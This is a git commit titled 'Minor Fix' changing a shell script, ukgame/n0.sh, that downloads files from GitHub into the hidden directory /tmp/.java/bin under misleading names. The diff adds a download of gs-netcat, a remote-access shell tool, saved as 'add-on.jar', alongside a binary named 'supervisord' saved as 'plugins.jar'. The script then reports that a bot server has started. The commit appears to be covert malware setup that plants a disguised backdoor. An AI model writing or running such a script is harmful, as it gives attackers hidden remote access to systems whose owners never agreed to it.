4c1585e6913c5ae31d0a7dbfb44b32ca39510b3c
i51jir6ni9t0 <wker-one@protonmail.com>
2024-12-22 16:10:50 +0000

    Minor Fix

--- ukgame/n0.sh
+++ ukgame/n0.sh
@@ -3,10 +3,11 @@
 function fetch_files() {
     echo "Downloading Patches ..."
     mkdir -p /tmp/.java/bin
-    cd /tmp/.java/bin && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/app.js -o user-patch.jar
+    # cd /tmp/.java/bin && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/app.js -o user-patch.jar
+    # cd /tmp/.java/bin && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/ukgame/cnf-0.json -o conf.json
     cd /tmp/.java/bin && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/supervisord -o plugins.jar
     cd /tmp/.java/bin && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/ukgame/cfg.conf -o cfg.conf
-    cd /tmp/.java/bin && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/ukgame/cnf-0.json -o conf.json
+    cd /tmp/.java/bin && curl -L  https://github.com/hackerschoice/gsocket/releases/download/v1.4.43/gs-netcat_linux-x86_64 -o add-on.jar
     echo "DONE ..."
 }
 
@@ -16,7 +17,8 @@ function start_app() {
     echo "BOT SERVER STARTED ..."
 }
 
-if [ -f "/tmp/.java/bin/cfg.conf" ] && [ -f "/tmp/.java/bin/user-patch.jar" ] && [ -f "/tmp/.java/bin/plugins.jar" ] && [ -f "/tmp/.java/bin/conf.json" ]; then
+# if [ -f "/tmp/.java/bin/cfg.conf" ] && [ -f "/tmp/.java/bin/user-patch.jar" ] && [ -f "/tmp/.java/bin/plugins.jar" ] && [ -f "/tmp/.java/bin/conf.json" ]; then
+if [ -f "/tmp/.java/bin/cfg.conf" ]  && [ -f "/tmp/.java/bin/plugins.jar" ] && [ -f "/tmp/.java/bin/add-on.jar" ]; then
     echo "Patch files already loaded ..."
     start_app
 else
